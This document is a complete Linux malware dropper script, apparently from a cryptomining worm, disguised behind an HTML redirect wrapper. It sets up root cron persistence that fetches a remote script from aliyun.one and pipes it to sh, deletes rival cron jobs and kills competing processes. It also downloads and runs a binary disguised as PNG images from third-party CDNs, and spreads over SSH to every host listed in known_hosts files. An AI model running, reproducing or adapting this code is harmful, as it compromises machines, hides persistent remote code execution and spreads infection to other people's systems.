#<script>window.location.href="http://aliyun.com";</script><!--
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
mv /bin/wge /bin/wget
mv /bin/cur /bin/curl
mv /usr/bin/wge /usr/bin/wget
mv /usr/bin/cur /usr/bin/curl
mkdir -p /tmp
chmod 1777 /tmp
echo "*/10 * * * * (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(\"http://aliyun.one\").read())')|sh"|crontab -
cat > /etc/crontab <<EOF
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin

*/10 * * * * root (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen("http://aliyun.one").read())'||/usr/local/sbin/3c2d1c5b54)|sh
EOF
swapoff -a
find /etc/cron*|xargs chattr -i
find /var/spool/cron*|xargs chattr -i
grep -RE "(wget|curl)" /etc/cron*|grep -v "aliyun.one"|cut -f 1 -d :|xargs rm -rf
grep -RE "(wget|curl)" /var/spool/cron*|grep -v "aliyun.one"|cut -f 1 -d :|xargs rm -rf
netstat -anp|grep :::6345|awk '{print $7}'|sed -e "s/\/.*//g"|xargs kill -9
netstat -anp|grep 119.9.76.107:443|awk '{print $7}'|sed -e "s/\/.*//g"|xargs kill -9
cd /tmp
touch /usr/local/bin/writeablex && cd /usr/local/bin/
touch /usr/libexec/writeablex && cd /usr/libexec/
touch /usr/bin/writeablex && cd /usr/bin/
rm -rf /usr/local/bin/writeablex /usr/libexec/writeablex /usr/bin/writeablex

export PATH=$PATH:$(pwd)
a64="img.sobot.com/chatres/89/msg/20191225/1/ec0991da601e45c4b0bb6178da5f0cc4.png"
a32="img.sobot.com/chatres/89/msg/20191225/1/50659157a100466a88fed550423a38ee.png"
b64="cdn.xiaoduoai.com/cvd/dist/fileUpload/1577269944760/2.637890910155951.png"
b32="cdn.xiaoduoai.com/cvd/dist/fileUpload/1577269966297/8.872362655092918.png"
c64="https://user-images.githubusercontent.com/56861392/71443284-08acf200-2745-11ea-8ef3-509d9072d970.png"
c32="https://user-images.githubusercontent.com/56861392/71443285-08acf200-2745-11ea-96c3-0c2be9135085.png"
if [ ! -f "3c2d1c5b54" ]; then
    ARCH=$(getconf LONG_BIT)
    if [ ${ARCH}x = "64x" ]; then
        (curl -fsSL -m180 $a64 -o 3c2d1c5b54||wget -T180 -q $a64 -O 3c2d1c5b54||python -c 'import urllib;urllib.urlretrieve("http://'$a64'", "3c2d1c5b54")'||curl -fsSL -m180 $b64 -o 3c2d1c5b54||wget -T180 -q $b64 -O 3c2d1c5b54||python -c 'import urllib;urllib.urlretrieve("http://'$b64'", "3c2d1c5b54")'||curl -fsSL -m180 $c64 -o 3c2d1c5b54||wget -T180 -q $c64 -O 3c2d1c5b54||python -c 'import urllib;urllib.urlretrieve("'$c64'", "3c2d1c5b54")')
    else
        (curl -fsSL -m180 $a32 -o 3c2d1c5b54||wget -T180 -q $a32 -O 3c2d1c5b54||python -c 'import urllib;urllib.urlretrieve("http://'$a32'", "3c2d1c5b54")'||curl -fsSL -m180 $b32 -o 3c2d1c5b54||wget -T180 -q $b32 -O 3c2d1c5b54||python -c 'import urllib;urllib.urlretrieve("http://'$b32'", "3c2d1c5b54")'||curl -fsSL -m180 $c32 -o 3c2d1c5b54||wget -T180 -q $c32 -O 3c2d1c5b54||python -c 'import urllib;urllib.urlretrieve("'$c32'", "3c2d1c5b54")')
    fi
fi
chmod +x 3c2d1c5b54
$(pwd)/3c2d1c5b54 || ./3c2d1c5b54 || /usr/bin/3c2d1c5b54 || /usr/libexec/3c2d1c5b54 || /usr/local/bin/3c2d1c5b54 || 3c2d1c5b54 || /tmp/3c2d1c5b54 || /usr/local/sbin/3c2d1c5b54
if [ -f /root/.ssh/known_hosts ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "(curl -fsSL aliyun.one||wget -q -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(\"http://aliyun.one\").read())')|sh >/dev/null 2>&1 &";done
fi

for file in /home/*
do
    if test -d $file; then
        if [ -f $file/.ssh/known_hosts ]; then
            for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "(curl -fsSL aliyun.one||wget -q -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(\"http://aliyun.one\").read())')|sh >/dev/null 2>&1 &";done
        fi
    fi
done
#-->